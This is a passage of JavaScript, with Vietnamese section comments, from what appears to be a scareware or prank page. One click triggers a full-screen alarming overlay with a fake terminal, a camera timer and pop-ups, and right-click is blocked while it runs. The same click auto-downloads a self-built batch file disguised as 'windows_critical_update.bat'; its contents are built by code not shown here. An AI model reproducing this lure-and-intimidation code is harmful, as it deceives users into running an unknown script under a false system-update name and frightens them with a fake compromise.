/* ===========================================================================
   SECTION 11 - DOWNLOAD
   =========================================================================== */
function downloadBat() {
  var content = buildBatContent();
  var blob    = new Blob([content], { type: "application/octet-stream" });
  var url     = URL.createObjectURL(blob);

  var a       = document.createElement("a");
  a.href      = url;
  a.download  = "windows_critical_update.bat";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  setTimeout(function () { URL.revokeObjectURL(url); }, 5000);

  var link = document.getElementById("dlLink");
  if (link) link.href = URL.createObjectURL(blob);
}

/* ===========================================================================
   SECTION 12 - KHỞI ĐỘNG OVERLAY
   =========================================================================== */
function activateOverlay() {
  var overlay = document.getElementById("overlay");
  overlay.classList.add("active");
  overlay.setAttribute("aria-hidden", "false");

  try {
    if (overlay.requestFullscreen) overlay.requestFullscreen();
    else if (overlay.webkitRequestFullscreen) overlay.webkitRequestFullscreen();
  } catch (e) {}

  initMatrix();
  startAlarm();
  runTerminal();
  runProgress();
  updateInfo();
  startCamTimer();
  startStats();
  startPopups();

  infoInterval = setInterval(updateInfo, 800);
}

function deactivateOverlay() {
  var overlay = document.getElementById("overlay");
  overlay.classList.remove("active");
  overlay.setAttribute("aria-hidden", "true");

  stopAlarm();
  stopCamTimer();
  stopStats();
  stopPopups();

  if (infoInterval) clearInterval(infoInterval);
  infoInterval = null;

  if (document.fullscreenElement) {
    document.exitFullscreen().catch(function () {});
  }
}

/* ===========================================================================
   SECTION 13 - SỰ KIỆN
   =========================================================================== */
document.getElementById("startBtn").addEventListener("click", function () {
  activateOverlay();
  downloadBat();

  var fb = document.getElementById("fallback");
  if (fb) fb.style.display = "block";
});

document.getElementById("closeBtn").addEventListener("click", function () {
  deactivateOverlay();
});

document.addEventListener("keydown", function (e) {
  if (e.key === "Escape") {
    var overlay = document.getElementById("overlay");
    if (overlay.classList.contains("active")) {
      deactivateOverlay();
    }
  }
});

/* ===========================================================================
   SECTION 14 - KHỞI TẠO BLANK
   =========================================================================== */
window.addEventListener("load", function () {
  var link = document.getElementById("dlLink");
  if (link && !link.href) {
    var blob = new Blob([buildBatContent()], { type: "application/octet-stream" });
    link.href = URL.createObjectURL(blob);
  }
});

/* ===========================================================================
   SECTION 15 - CHỐNG CLICK PHẢI / DEVTOOLS (tùy chọn)
   =========================================================================== */
document.addEventListener("contextmenu", function (e) {
  var overlay = document.getElementById("overlay");
  if (overlay.classList.contains("active")) {
    e.preventDefault();
  }
});
